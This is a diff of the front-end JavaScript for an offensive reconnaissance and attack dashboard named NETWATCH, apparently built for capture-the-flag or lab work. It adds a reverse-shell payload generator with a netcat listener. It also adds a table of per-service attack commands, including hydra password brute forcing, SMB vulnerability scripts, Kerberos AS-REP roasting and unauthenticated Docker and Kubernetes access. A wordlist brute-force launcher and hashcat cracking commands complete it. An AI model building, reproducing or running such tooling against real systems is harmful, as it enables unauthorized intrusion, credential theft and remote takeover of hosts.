-  document.getElementById('a-words').value=words.join('\n');
+socket.on('log',         ({msg, type}) => log(msg, type));
+socket.on('preset_data', ({name, words}) => {
+  document.getElementById('a-words').value = words.join('\n');
   updateWC();
-  log(`Loaded ${words.length} ${name} entries`,'info');
+  log(`Loaded ${words.length} ${name} entries`, 'info');
+});
+
+// ── Shell events ──
+let _shellPayloads = {};
+socket.on('shell_payloads', ({payloads, tty}) => {
+  _shellPayloads = payloads;
+  const LABELS = {
+    bash:'Bash', bash_alt:'Bash (alt)', python3:'Python3', python:'Python2',
+    php:'PHP', php_proc:'PHP proc_open', perl:'Perl', ruby:'Ruby',
+    netcat:'Netcat (mkfifo)', nc_e:'Netcat (-e)', powershell:'PowerShell', awk:'AWK',
+  };
+  const list = document.getElementById('sh-list');
+  list.innerHTML = '';
+  Object.entries(payloads).forEach(([name, cmd]) => {
+    const card    = document.createElement('div');
+    card.className = 'shell-card';
+    const label   = document.createElement('div');
+    label.className = 'shell-label';
+    const ns      = document.createElement('span');
+    ns.textContent = LABELS[name] || name.toUpperCase();
+    const cb      = document.createElement('button');
+    cb.className   = 'copy-btn'; cb.textContent = '⎘ Copy';
+    cb.onclick     = () => copyText(cb, cmd);
+    label.append(ns, cb);
+    const cmdDiv  = document.createElement('div');
+    cmdDiv.className   = 'shell-cmd'; cmdDiv.textContent = cmd;
+    card.append(label, cmdDiv);
+    list.appendChild(card);
+  });
+  const ttyList = document.getElementById('tty-list');
+  ttyList.innerHTML = '';
+  (tty || []).forEach(cmd => {
+    const card = document.createElement('div');
+    card.className = 'tty-card';
+    const cs = document.createElement('span');
+    cs.className = 'tty-cmd'; cs.textContent = cmd;
+    card.appendChild(cs);
+    if (!cmd.startsWith('#')) {
+      const cb = document.createElement('button');
+      cb.className = 'copy-btn'; cb.textContent = '⎘'; cb.style.padding = '2px 5px';
+      cb.onclick = () => copyText(cb, cmd);
+      card.appendChild(cb);
+    }
+    ttyList.appendChild(card);
+  });
+  log(`Generated ${Object.keys(payloads).length} reverse shell payloads`, 'success');
+  showRight('log');
+});
+
+socket.on('listener_data',   ({line}) => log(`[NC] ${line}`, 'hit'));
+socket.on('listener_status', ({state}) => {
+  const r = state === 'running';
+  document.getElementById('btn-lst').disabled  = r;
+  document.getElementById('btn-lstp').disabled = !r;
+  if (r) showRight('log');
 });
 
 // ═══════════════════════════════════════════════════════════
 // FINDINGS PANEL
 // ═══════════════════════════════════════════════════════════
-const portRows={};  // port → row el
-const httpCards={}; // port → card el
+const portRows  = {};
+const httpCards = {};
+const cveWraps  = {};
 
-function clearFindings(){
-  document.getElementById('find-body').innerHTML='';
-  Object.keys(portRows).forEach(k=>delete portRows[k]);
-  Object.keys(httpCards).forEach(k=>delete httpCards[k]);
+const SERVICE_CMDS = {
+  'FTP':          ['ftp {h}', 'nmap -sV --script ftp-anon,ftp-bounce -p {p} {h}', 'hydra -l admin -P rockyou.txt ftp://{h}'],
+  'SSH':          ['ssh root@{h}', 'nmap --script ssh-auth-methods -p {p} {h}', 'hydra -l root -P rockyou.txt ssh://{h}'],
+  'SMTP':         ['nc -nv {h} {p}', 'nmap --script smtp-enum-users -p {p} {h}'],
+  'HTTP':         ['curl -I http://{h}:{p}/', 'gobuster dir -u http://{h}:{p} -w /usr/share/wordlists/dirb/common.txt', 'nikto -h http://{h}:{p}', 'ffuf -u http://{h}:{p}/FUZZ -w common.txt'],
+  'HTTP-Alt':     ['curl -I http://{h}:{p}/', 'gobuster dir -u http://{h}:{p} -w /usr/share/wordlists/dirb/common.txt', 'nikto -h http://{h}:{p}'],
+  'HTTP?':        ['curl -I http://{h}:{p}/', 'gobuster dir -u http://{h}:{p} -w /usr/share/wordlists/dirb/common.txt', 'nikto -h http://{h}:{p}'],
+  'HTTPS':        ['curl -kI https://{h}:{p}/', 'gobuster dir -u https://{h}:{p} -w /usr/share/wordlists/dirb/common.txt -k', 'sslscan {h}:{p}'],
+  'HTTPS-Alt':    ['curl -kI https://{h}:{p}/', 'gobuster dir -u https://{h}:{p} -w /usr/share/wordlists/dirb/common.txt -k', 'sslscan {h}:{p}'],
+  'SMB':          ['smbclient -L //{h} -N', 'smbmap -H {h}', 'enum4linux -a {h}', 'crackmapexec smb {h}', 'nmap --script smb-vuln* -p 445 {h}'],
+  'NetBIOS':      ['nbtscan {h}', 'nmblookup -A {h}'],
+  'MySQL':        ['mysql -h {h} -u root', 'nmap --script mysql-info -p {p} {h}'],
+  'PostgreSQL':   ['psql -h {h} -U postgres', 'nmap --script pgsql-brute -p {p} {h}'],
+  'MongoDB':      ['mongo --host {h} --port {p}', 'nmap --script mongodb-info -p {p} {h}'],
+  'Redis':        ['redis-cli -h {h} -p {p}', 'redis-cli -h {h} -p {p} info', 'redis-cli -h {h} -p {p} config get *'],
+  'MSSQL':        ['nmap --script ms-sql-info -p {p} {h}', 'impacket-mssqlclient {h}'],
+  'RDP':          ['xfreerdp /v:{h} /u:administrator /cert-ignore', 'nmap --script rdp-enum-encryption -p {p} {h}'],
+  'VNC':          ['vncviewer {h}:{p}', 'nmap --script vnc-info,vnc-brute -p {p} {h}'],
+  'VNC-HTTP':     ['curl http://{h}:{p}/', 'nmap --script vnc-info -p {p} {h}'],
+  'Telnet':       ['telnet {h} {p}'],
+  'SNMP':         ['snmpwalk -v2c -c public {h}', 'onesixtyone -c public {h}'],
+  'LDAP':         ['ldapsearch -h {h} -x -b "" -s base', 'ldapdomaindump {h}'],
+  'LDAPS':        ['ldapsearch -H ldaps://{h} -x -b "" -s base'],
+  'Kerberos':     ['GetNPUsers.py DOMAIN/ -dc-ip {h} -no-pass', 'nmap --script krb5-enum-users -p {p} {h}'],
+  'NFS':          ['showmount -e {h}', 'mount -t nfs {h}:/ /mnt/nfs', 'nmap --script nfs-ls -p 2049 {h}'],
+  'Docker':       ['curl http://{h}:{p}/version', 'curl http://{h}:{p}/containers/json', 'docker -H tcp://{h}:{p} ps'],
+  'Elasticsearch':['curl http://{h}:{p}/', 'curl http://{h}:{p}/_cat/indices', 'curl http://{h}:{p}/_all/_search'],
+  'Kibana':       ['curl http://{h}:{p}/', 'curl http://{h}:{p}/api/status'],
+  'RMI':          ['nmap --script rmi-dumpregistry -p {p} {h}'],
+  'Jupyter?':     ['curl http://{h}:{p}/api/kernels', 'curl http://{h}:{p}/tree'],
+  'WebLogic':     ['curl http://{h}:{p}/console/', 'nmap --script weblogic-t3-info -p {p} {h}'],
+  'GlassFish':    ['curl http://{h}:{p}/management/', 'nmap -sV -p {p} {h}'],
+  'etcd':         ['curl http://{h}:{p}/version', 'curl http://{h}:{p}/v2/keys'],
+  'K8s-API':      ['curl -k https://{h}:{p}/api/v1/pods', 'kubectl --server=https://{h}:{p} --insecure-skip-tls-verify get pods'],
+};
+
+function clearFindings() {
+  document.getElementById('find-body').innerHTML = '<div style="color:rgba(0,200,255,.3);font-size:11px;text-align:center;margin-top:30px">Run a recon scan to populate findings</div>';
+  [portRows, httpCards, cveWraps].forEach(o => Object.keys(o).forEach(k => delete o[k]));
 }
 
-function ensureSect(id,label){
-  let el=document.getElementById('fs-'+id);
-  if(!el){
-    const fb=document.getElementById('find-body');
-    // Remove placeholder
-    const ph=fb.querySelector('div[style]');
-    if(ph) ph.remove();
-    el=document.createElement('div');
-    el.id='fs-'+id;
-    el.innerHTML=`<div class="find-sect">${label}</div>`;
+function ensureSect(id, label) {
+  let el = document.getElementById('fs-' + id);
+  if (!el) {
+    const fb = document.getElementById('find-body');
+    const ph = fb.querySelector('div[style*="text-align:center"]');
+    if (ph) ph.remove();
+    el = document.createElement('div');
+    el.id = 'fs-' + id;
+    el.innerHTML = `<div class="find-sect">${label}</div>`;
     fb.appendChild(el);
   }
   return el;
 }
 
-function addPortRow(port,service,banner,ip){
-  const sec=ensureSect('ports','Open Ports');
-  if(portRows[port]) return; // already exists
+function addPortRow(port, service, banner) {
+  const host = document.getElementById('s-host').value;
+  const sec  = ensureSect('ports', 'Open Ports');
+  if (portRows[port]) return;
 
-  const row=document.createElement('div');
-  row.className='port-row';
-  row.innerHTML=`
+  const wrap = document.createElement('div');
+  wrap.className = 'port-wrap';
+
+  const row = document.createElement('div');
+  row.className = 'port-row';
+
+  const atkBtn = document.createElement('button');
+  atkBtn.className   = 'atk-btn';
+  atkBtn.textContent = '→ Atk';
+  atkBtn.onclick     = () => prefillAttack(host, port, service);
+
+  const cmds = (SERVICE_CMDS[service] || []).map(c => c.replace(/{h}/g, host).replace(/{p}/g, port));
+  const cmdBtn = document.createElement('button');
+  cmdBtn.className   = 'cmd-btn';
+  cmdBtn.textContent = '⌘';
+  cmdBtn.title       = 'Show commands in log';
+  cmdBtn.onclick     = () => showServiceCmds(service, host, port, cmds);
+  if (!cmds.length) cmdBtn.style.opacity = '0.2';
+
+  row.innerHTML = `
     <span class="port-num">${port}</span>
     <span class="port-svc">${service}</span>
-    <span class="port-ban" id="ban-${port}">${banner||'—'}</span>
-    <button class="atk-btn" onclick="prefillAttack('${ip||document.getElementById('s-host').value}',${port},'${service}')">→ Atk</button>
+    <span class="port-ban" id="ban-${port}">${banner || '—'}</span>
   `;
-  sec.appendChild(row);
-  portRows[port]=row;
+  row.append(atkBtn, cmdBtn);
+  wrap.appendChild(row);
+
+  sec.appendChild(wrap);
+  portRows[port] = wrap;
+  cveWraps[port] = wrap; // used by addCveHint
 }
 
-function updateHttpCard(port,info){
-  const sec=ensureSect('http','Web Services');
-  let card=httpCards[port];
-  if(!card){
-    card=document.createElement('div');
-    card.className='http-card';
+function addCveHint(port, cve, detail) {
+  const wrap = cveWraps[port];
+  if (!wrap) return;
+  const row = document.createElement('div');
+  row.className = 'cve-row';
+  row.innerHTML = `<div class="cve-id">⚡ ${cve}</div><div class="cve-detail">${detail}</div>`;
+  wrap.appendChild(row);
+}
+
+function updateHttpCard(port, info) {
+  const sec = ensureSect('http', 'Web Services');
+  let card = httpCards[port];
+  if (!card) {
+    card = document.createElement('div');
+    card.className = 'http-card';
     sec.appendChild(card);
-    httpCards[port]=card;
+    httpCards[port] = card;
   }
-
-  const statusClass=info.status>=400?'color:var(--r)':info.status>=300?'color:var(--a)':'color:var(--g)';
-  const pathRows=(info.paths||[]).map(p=>{
-    const sc=p.status; const cls=sc===200?'s200':sc===301||sc===302?'s301':sc===403?'s403':'';
-    return `<div class="path-row">
-      <span class="pth">${p.path}</span>
-      <span class="psc ${cls}">${sc}</span>
-      <span class="psz">${p.size}b</span>
-    </div>`;
+  const sc = info.status;
+  const statusStyle = sc >= 400 ? 'color:var(--r)' : sc >= 300 ? 'color:var(--a)' : 'color:var(--g)';
+  const pathRows = (info.paths || []).map(p => {
+    const cls = p.status === 200 ? 's200' : (p.status === 301 || p.status === 302) ? 's301' : p.status === 403 ? 's403' : '';
+    return `<div class="path-row"><span class="pth">${p.path}</span><span class="psc ${cls}">${p.status}</span><span class="psz">${p.size}b</span></div>`;
   }).join('');
-
-  card.innerHTML=`
+  card.innerHTML = `
     <div class="http-url">${info.url}</div>
-    <div class="http-meta" style="${statusClass}">
-      ${info.status} ${info.title?`· "${info.title}"`:''} ${info.server?`· ${info.server}`:''}
-    </div>
+    <div class="http-meta" style="${statusStyle}">${sc} ${info.title ? `· "${info.title}"` : ''} ${info.server ? `· ${info.server}` : ''}</div>
     ${pathRows}
-    ${info.interesting?.map(i=>`<div class="http-meta" style="color:var(--a)">${i}</div>`).join('')||''}
+    ${(info.interesting || []).map(i => `<div class="http-meta" style="color:var(--a)">${i}</div>`).join('')}
   `;
 }
+
+function showServiceCmds(service, host, port, cmds) {
+  if (!cmds.length) { log(`No command suggestions for ${service}`, 'warn'); return; }
+  showRight('log');
+  log(`── ${service} commands for ${host}:${port} ──`, 'info');
+  cmds.forEach(c => log(`  ${c}`, 'hit'));
+}
+
+function exportFindings() {
+  const host = document.getElementById('s-host').value || 'unknown';
+  let md = `# NETWATCH Report\n\n**Target:** \`${host}\`  \n**Date:** ${new Date().toISOString()}\n\n---\n\n## Open Ports\n\n| Port | Service | Banner |\n|------|---------|--------|\n`;
+  Object.entries(portRows).forEach(([port, wrap]) => {
+    const svc = wrap.querySelector('.port-svc')?.textContent || '';
+    const ban = wrap.querySelector('.port-ban')?.textContent || '';
+    md += `| ${port} | ${svc} | ${ban} |\n`;
+  });
+  md += '\n## Web Services\n\n';
+  Object.entries(httpCards).forEach(([port, card]) => {
+    const url = card.querySelector('.http-url')?.textContent || '';
+    md += `### ${url}\n\n`;
+    const paths = [...card.querySelectorAll('.path-row')];
+    if (paths.length) {
+      md += '| Path | Status | Size |\n|------|--------|------|\n';
+      paths.forEach(r => {
+        const p = r.querySelector('.pth')?.textContent || '';
+        const s = r.querySelector('.psc')?.textContent || '';
+        const z = r.querySelector('.psz')?.textContent || '';
+        md += `| ${p} | ${s} | ${z} |\n`;
+      });
+    }
+    md += '\n';
+  });
+  const blob = new Blob([md], { type: 'text/markdown' });
+  const a    = document.createElement('a');
+  a.href     = URL.createObjectURL(blob);
+  a.download = `netwatch-${host.replace(/\./g,'-')}-${Date.now()}.md`;
+  a.click();
+  URL.revokeObjectURL(a.href);
+  log('Exported findings as Markdown', 'success');
+}
+
+// ═══════════════════════════════════════════════════════════
+// TOOLS TAB — Encode/Decode + Hash Identifier
+// ═══════════════════════════════════════════════════════════
+function doEncode() {
+  const inp  = document.getElementById('enc-in').value;
+  const type = document.getElementById('enc-type').value;
+  let out = '';
+  try {
+    switch (type) {
+      case 'base64':    out = btoa(unescape(encodeURIComponent(inp))); break;
+      case 'base64url': out = btoa(unescape(encodeURIComponent(inp))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,''); break;
+      case 'hex':       out = Array.from(new TextEncoder().encode(inp)).map(b => b.toString(16).padStart(2,'0')).join(' '); break;
+      case 'url':       out = encodeURIComponent(inp); break;
+      case 'rot13':     out = rot13(inp); break;
+      case 'html':      out = inp.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); break;
+      case 'jwt':       out = decodeJwt(inp); break;
+      default: out = inp;
+    }
+  } catch(e) { out = `Error: ${e.message}`; }
+  document.getElementById('enc-out').value = out;
+}
+
+function doDecode() {
+  const inp  = document.getElementById('enc-in').value;
+  const type = document.getElementById('enc-type').value;
+  let out = '';
+  try {
+    switch (type) {
+      case 'base64':    out = decodeURIComponent(escape(atob(inp))); break;
+      case 'base64url': out = decodeURIComponent(escape(atob(inp.replace(/-/g,'+').replace(/_/g,'/')))); break;
+      case 'hex':       out = inp.trim().split(/\s+/).map(b => String.fromCharCode(parseInt(b,16))).join(''); break;
+      case 'url':       out = decodeURIComponent(inp); break;
+      case 'rot13':     out = rot13(inp); break;
+      case 'html':      { const t = document.createElement('textarea'); t.innerHTML = inp; out = t.value; break; }
+      case 'jwt':       out = decodeJwt(inp); break;
+      default: out = inp;
+    }
+  } catch(e) { out = `Error: ${e.message}`; }
+  document.getElementById('enc-out').value = out;
+}
+
+function rot13(s) {
+  return s.replace(/[a-zA-Z]/g, c => {
+    const base = c <= 'Z' ? 65 : 97;
+    return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
+  });
+}
+
+function decodeJwt(token) {
+  const parts = token.trim().split('.');
+  if (parts.length < 2) return 'Not a valid JWT (needs 3 dot-separated parts)';
+  const decodePart = b64 => {
+    try {
+      const padded = b64.replace(/-/g,'+').replace(/_/g,'/') + '=='.slice(0, (4 - b64.length % 4) % 4);
+      return JSON.stringify(JSON.parse(decodeURIComponent(escape(atob(padded)))), null, 2);
+    } catch { return b64; }
+  };
+  return `── HEADER ──\n${decodePart(parts[0])}\n\n── PAYLOAD ──\n${decodePart(parts[1])}\n\n── SIGNATURE ──\n${parts[2] || '(none)'}`;
+}
+
+function swapEnc() {
+  const inp = document.getElementById('enc-in');
+  const out = document.getElementById('enc-out');
+  inp.value = out.value;
+  out.value = '';
+}
+function copyEncOut() {
+  const text = document.getElementById('enc-out').value;
+  if (!text) return;
+  navigator.clipboard.writeText(text).then(() => log('Copied encoder output', 'info'));
+}
+
+// Hash identification
+const HASH_PATTERNS = [
+  { name: 'MD5 / NTLM*',  regex: /^[a-f0-9]{32}$/i,                     hc: '0 (MD5) / 1000 (NTLM)', john: 'raw-md5 / nt',      note: '*NTLM if from Windows' },
+  { name: 'SHA-1',         regex: /^[a-f0-9]{40}$/i,                     hc: '100',  john: 'raw-sha1'   },
+  { name: 'SHA-224',       regex: /^[a-f0-9]{56}$/i,                     hc: '1300', john: 'raw-sha224' },
+  { name: 'SHA-256',       regex: /^[a-f0-9]{64}$/i,                     hc: '1400', john: 'raw-sha256' },
+  { name: 'SHA-384',       regex: /^[a-f0-9]{96}$/i,                     hc: '10800',john: 'raw-sha384' },
+  { name: 'SHA-512',       regex: /^[a-f0-9]{128}$/i,                    hc: '1700', john: 'raw-sha512' },
+  { name: 'bcrypt',        regex: /^\$2[ayb]\$.{56}$/,                   hc: '3200', john: 'bcrypt'     },
+  { name: 'SHA-512crypt',  regex: /^\$6\$[^\$]{8,16}\$.{86}$/,           hc: '1800', john: 'sha512crypt' },
+  { name: 'SHA-256crypt',  regex: /^\$5\$[^\$]{8,16}\$.{43}$/,           hc: '7400', john: 'sha256crypt' },
+  { name: 'MD5crypt',      regex: /^\$1\$[^\$]{1,8}\$.{22}$/,            hc: '500',  john: 'md5crypt'   },
+  { name: 'MySQL 4.1+',    regex: /^\*[a-f0-9]{40}$/i,                   hc: '300',  john: 'mysql-sha1' },
+  { name: 'CRC-32',        regex: /^[a-f0-9]{8}$/i,                      hc: '11500',john: 'CRC32'      },
+  { name: 'Keccak-256',    regex: /^[a-f0-9]{64}$/i,                     hc: '17800',john: 'keccak-256', note: 'Same length as SHA-256' },
+  { name: 'PBKDF2-SHA256', regex: /^\$pbkdf2-sha256\$/,                  hc: '10900',john: 'pbkdf2-hmac-sha256' },
+  { name: 'Argon2',        regex: /^\$argon2/,                           hc: '25700 (argon2i)',john: 'argon2' },
+  { name: 'Scrypt',        regex: /^\$scrypt\$/,                         hc: '8900', john: 'scrypt'     },
+];
+
+function identifyHashLive(val) {
+  if (val.trim().length > 5) identifyHash();
+  else document.getElementById('hash-out').innerHTML = '';
+}
+
+function identifyHash() {
+  const h   = document.getElementById('hash-in').value.trim();
+  const out = document.getElementById('hash-out');
+  if (!h) { out.innerHTML = ''; return; }
+  const matches = HASH_PATTERNS.filter(p => p.regex.test(h));
+  if (!matches.length) {
+    out.innerHTML = '<div style="color:var(--r);font-size:10px;margin-top:6px">No pattern matched — may be salted, custom, or non-standard encoding</div>';
+    return;
+  }
+  out.innerHTML = matches.map(m => `
+    <div class="hash-match">
+      <div class="hash-name">${m.name}</div>
+      <div class="hash-modes">
+        <span class="hash-hc">hashcat: <span>-m ${m.hc}</span></span>
+        <span class="hash-john">john: <span>--format=${m.john}</span></span>
+      </div>
+      <div class="hash-cmd">hashcat -m ${m.hc.split(' ')[0]} hash.txt rockyou.txt --force</div>
+      ${m.note ? `<div style="color:rgba(255,170,0,.5);font-size:9px;margin-top:2px">${m.note}</div>` : ''}
+    </div>
+  `).join('');
+}
+
+// ═══════════════════════════════════════════════════════════
+// NOTES
+// ═══════════════════════════════════════════════════════════
+const NOTES_KEY = 'netwatch-notes';
+const notesEl   = document.getElementById('notes');
+notesEl.value   = localStorage.getItem(NOTES_KEY) || '';
+notesEl.addEventListener('input', () => {
+  localStorage.setItem(NOTES_KEY, notesEl.value);
+  document.getElementById('note-saved').textContent = 'SAVED ✓';
+  setTimeout(() => document.getElementById('note-saved').textContent = 'AUTO-SAVED', 1200);
+});
+function clearNotes()  { notesEl.value = ''; localStorage.removeItem(NOTES_KEY); }
+function copyNotes()   { navigator.clipboard.writeText(notesEl.value).then(() => log('Copied notes', 'info')); }
 
 // ═══════════════════════════════════════════════════════════
 // UI HELPERS
 // ═══════════════════════════════════════════════════════════
-function setStat(state,label){
-  document.getElementById('sd').className=`dot ${state}`;
-  document.getElementById('st').textContent=label;
+function setStat(state, label) {
+  document.getElementById('sd').className   = `dot ${state}`;
+  document.getElementById('st').textContent = label;
 }
 
-function log(msg,type='info'){
-  const c=document.getElementById('log-body');
-  const ts=new Date().toLocaleTimeString('en-US',{hour12:false});
-  const d=document.createElement('div');
-  d.className=`ll ${type}`; d.textContent=`[${ts}] ${msg}`;
+function log(msg, type = 'info') {
+  const c  = document.getElementById('log-body');
+  const ts = new Date().toLocaleTimeString('en-US', { hour12: false });
+  const d  = document.createElement('div');
+  d.className   = `ll ${type}`;
+  d.textContent = `[${ts}] ${msg}`;
   c.appendChild(d);
-  while(c.children.length>400) c.removeChild(c.firstChild);
-  c.scrollTop=c.scrollHeight;
+  while (c.children.length > 500) c.removeChild(c.firstChild);
+  c.scrollTop = c.scrollHeight;
 }
-function clearLog(){document.getElementById('log-body').innerHTML=''}
+function clearLog() { document.getElementById('log-body').innerHTML = ''; }
 
-function showLeft(tab){
-  document.getElementById('ls-scan').style.display=tab==='scan'?'flex':'none';
-  document.getElementById('ls-atk').style.display =tab==='atk' ?'flex':'none';
-  document.getElementById('lt-scan').classList.toggle('active',tab==='scan');
-  document.getElementById('lt-atk').classList.toggle('active',tab==='atk');
-  if(tab==='scan') document.getElementById('ls-scan').style.flexDirection='column';
-}
-function showRight(tab){
-  document.getElementById('rs-find').style.display=tab==='find'?'flex':'none';
-  document.getElementById('rs-log').style.display =tab==='log' ?'flex':'none';
-  document.getElementById('rt-find').classList.toggle('active',tab==='find');
-  document.getElementById('rt-log').classList.toggle('active',tab==='log');
-  if(tab==='find') document.getElementById('rs-find').style.flexDirection='column';
-  if(tab==='log')  document.getElementById('rs-log').style.flexDirection='column';
-}
-
-// Port scope
-let portMode='common';
-function setPortMode(m){
-  portMode=m;
-  ['common','all','custom'].forEach(id=>{
-    document.getElementById('pm-'+id).classList.toggle('active',id===m);
+function showLeft(tab) {
+  ['scan','atk','sh','rep','creds'].forEach(t => {
+    document.getElementById(`ls-${t}`).style.display  = t === tab ? 'flex' : 'none';
+    document.getElementById(`lt-${t}`).classList.toggle('active', t === tab);
+    if (t === tab) document.getElementById(`ls-${t}`).style.flexDirection = 'column';
   });
-  document.getElementById('s-range').style.display=m==='custom'?'block':'none';
+  if (tab === 'sh')    fetchLocalIP();
+  if (tab === 'rep')   updateRepBody();
+  if (tab === 'creds') renderCreds();
 }
 
-// Attack mode
-let aMode='numeric',aMethod='get';
-function setAMode(m){
-  aMode=m;
-  document.getElementById('am-num').classList.toggle('active',m==='numeric');
-  document.getElementById('am-word').classList.toggle('active',m==='wordlist');
-  document.getElementById('as-num').style.display =m==='numeric' ?'block':'none';
-  document.getElementById('as-word').style.display=m==='wordlist'?'block':'none';
-}
-function setAMethod(m){
-  aMethod=m;
-  document.getElementById('am-get').classList.toggle('active',m==='get');
-  document.getElementById('am-post').classList.toggle('active',m==='post');
-  document.getElementById('as-body').style.display=m==='post'?'block':'none';
+function showRight(tab) {
+  const ids = { find:'rs-find', log:'rs-log', resp:'rs-resp', tool:'rs-tool', note:'rs-note' };
+  Object.entries(ids).forEach(([t, id]) => {
+    const el = document.getElementById(id);
+    el.style.display = t === tab ? 'flex' : 'none';
+    if (t === tab) el.style.flexDirection = 'column';
+    document.getElementById(`rt-${t}`).classList.toggle('active', t === tab);
+  });
 }
 
-function updateWC(){
-  const words=document.getElementById('a-words').value.split('\n').filter(w=>w.trim());
-  document.getElementById('wc').textContent=`(${words.length})`;
+let portMode = 'common';
+function setPortMode(m) {
+  portMode = m;
+  ['common','all','custom'].forEach(id => document.getElementById('pm-'+id).classList.toggle('active', id === m));
+  document.getElementById('s-range').style.display = m === 'custom' ? 'block' : 'none';
 }
 
-function loadPreset(name){
-  socket.emit('get_preset',{name});
+let aMode = 'numeric', aMethod = 'get';
+function setAMode(m) {
+  aMode = m;
+  document.getElementById('am-num').classList.toggle('active',  m === 'numeric');
+  document.getElementById('am-word').classList.toggle('active', m === 'wordlist');
+  document.getElementById('as-num').style.display  = m === 'numeric'  ? 'block' : 'none';
+  document.getElementById('as-word').style.display = m === 'wordlist' ? 'block' : 'none';
+}
+function setAMethod(m) {
+  aMethod = m;
+  document.getElementById('am-get').classList.toggle('active',  m === 'get');
+  document.getElementById('am-post').classList.toggle('active', m === 'post');
+  document.getElementById('as-body').style.display = m === 'post' ? 'block' : 'none';
 }
 
-// Prefill attack from findings click
-function prefillAttack(host,port,service){
-  const isWeb=service.includes('HTTP')||service.includes('HTTPS')||port===80||port===443;
-  const scheme=port===443||service==='HTTPS'?'https':'http';
-  if(isWeb){
-    document.getElementById('a-url').value=`${scheme}://${host}:${port}/{word}`;
-    setAMode('wordlist');
-    setAMethod('get');
-    document.getElementById('a-code').value='200';
-    document.getElementById('a-fail').value='';
+function updateWC() {
+  document.getElementById('wc').textContent =
+    `(${document.getElementById('a-words').value.split('\n').filter(w => w.trim()).length})`;
+}
+function loadPreset(name) { socket.emit('get_preset', { name }); }
+
+function prefillAttack(host, port, service) {
+  const scheme = (port === 443 || service === 'HTTPS' || service === 'HTTPS-Alt') ? 'https' : 'http';
+  const isWeb  = /HTTP|HTTPS/i.test(service) || port === 80 || port === 443;
+  if (isWeb) {
+    document.getElementById('a-url').value  = `${scheme}://${host}:${port}/{word}`;
+    setAMode('wordlist'); setAMethod('get');
+    document.getElementById('a-code').value = '200';
+    document.getElementById('a-fail').value = '';
     loadPreset('dirs');
   } else {
-    document.getElementById('a-url').value=`http://${host}:${port}/{word}`;
+    document.getElementById('a-url').value = `http://${host}:${port}/{word}`;
   }
   showLeft('atk');
-  log(`Pre-filled attack → ${host}:${port} (${service})`,'info');
+  log(`Pre-filled attack → ${host}:${port} (${service})`, 'info');
 }
 
 // ── Launch scan ──
-function launchScan(){
-  const host=document.getElementById('s-host').value.trim();
-  if(!host){log('Enter a target IP or hostname','error');return;}
+function launchScan() {
+  const host = document.getElementById('s-host').value.trim();
+  if (!host) { log('Enter a target IP or hostname', 'error'); return; }
   clearFindings();
   document.getElementById('fo').classList.remove('show');
-  G.foundFlag=false;
-  let pm=portMode;
-  if(pm==='custom'){
-    const a=document.getElementById('s-p1').value;
-    const b=document.getElementById('s-p2').value;
-    pm=`${a}-${b}`;
-  }
-  socket.emit('start_scan',{host,port_mode:pm,threads:document.getElementById('s-threads').value});
+  G.foundFlag = false;
+  let pm = portMode;
+  if (pm === 'custom') pm = `${document.getElementById('s-p1').value}-${document.getElementById('s-p2').value}`;
+  socket.emit('start_scan', { host, port_mode: pm, threads: document.getElementById('s-threads').value });
 }
-function stopScan(){socket.emit('stop_scan')}
+function stopScan() { socket.emit('stop_scan'); }
 
 // ── Launch attack ──
-function launchAttack(){
-  const url=document.getElementById('a-url').value.trim();
-  if(!url){log('Enter a target URL','error');return;}
-  const words=aMode==='wordlist'
-    ?document.getElementById('a-words').value.split('\n').map(w=>w.trim()).filter(Boolean)
-    :[];
-  if(aMode==='wordlist'&&!words.length){log('Add words to list first','error');return;}
+function launchAttack() {
+  const url = document.getElementById('a-url').value.trim();
+  if (!url) { log('Enter a target URL', 'error'); return; }
+  const words = aMode === 'wordlist'
+    ? document.getElementById('a-words').value.split('\n').map(w => w.trim()).filter(Boolean)
+    : [];
+  if (aMode === 'wordlist' && !words.length) { log('Add words to list first', 'error'); return; }
   document.getElementById('fo').classList.remove('show');
-  G.foundFlag=false;
-  socket.emit('start_attack',{
-    url,mode:aMode,method:aMethod,
-    body:   document.getElementById('a-body').value.trim(),
-    headers:document.getElementById('a-hdrs').value,
+  G.foundFlag = false;
+  socket.emit('start_attack', {
+    url, mode: aMode, method: aMethod,
+    body:         document.getElementById('a-body').value.trim(),
+    headers:      document.getElementById('a-hdrs').value,
     words,
-    success_key: document.getElementById('a-key').value.trim(),
-    success_code:document.getElementById('a-code').value.trim(),
-    success_text:document.getElementById('a-text').value.trim(),
-    fail_text:   document.getElementById('a-fail').value.trim(),
-    threads:     document.getElementById('a-threads').value,
-    start:       document.getElementById('a-start').value,
-    end:         document.getElementById('a-end').value,
+    success_key:  document.getElementById('a-key').value.trim(),
+    success_code: document.getElementById('a-code').value.trim(),
+    success_text: document.getElementById('a-text').value.trim(),
+    fail_text:    document.getElementById('a-fail').value.trim(),
+    threads:      document.getElementById('a-threads').value,
+    start:        document.getElementById('a-start').value,
+    end:          document.getElementById('a-end').value,
   });
 }
-function stopAttack(){socket.emit('stop_attack')}
+function stopAttack() { socket.emit('stop_attack'); }
 
-document.getElementById('s-host').addEventListener('keydown',e=>{if(e.key==='Enter')launchScan()});
-document.getElementById('a-url').addEventListener('keydown', e=>{if(e.key==='Enter')launchAttack()});
+// ── Shells ──
+let _ipFetched = false;
+async function fetchLocalIP() {
+  if (_ipFetched) return;
+  try {
+    const d  = await (await fetch('/api/localip')).json();
+    const ip = d.tun0 || d.ip;
+    document.getElementById('sh-ip').value = ip;
+    document.getElementById('ip-hint').textContent = d.tun0 ? '(tun0)' : '(eth0)';
+    log(`Local IP: ${ip}${d.tun0 ? ' [tun0]' : ''}`, 'info');
+    _ipFetched = true;
+  } catch { log('Could not auto-detect local IP', 'warn'); }
+}
+function generateShells() {
+  const ip   = document.getElementById('sh-ip').value.trim();
+  const port = document.getElementById('sh-port').value.trim();
+  if (!ip) { log('Enter LHOST first', 'error'); return; }
+  socket.emit('get_shells', { ip, port });
+}
+function copyText(btn, text) {
+  navigator.clipboard.writeText(text).then(() => {
+    const orig = btn.textContent;
+    btn.textContent = '✓ Copied'; btn.style.color = 'var(--g)';
+    setTimeout(() => { btn.textContent = orig; btn.style.color = ''; }, 1400);
+  }).catch(() => log('Clipboard copy failed', 'error'));
+}
+function startListener() { socket.emit('start_listener', { port: document.getElementById('sh-port').value }); }
+function stopListener()  { socket.emit('stop_listener'); }
+
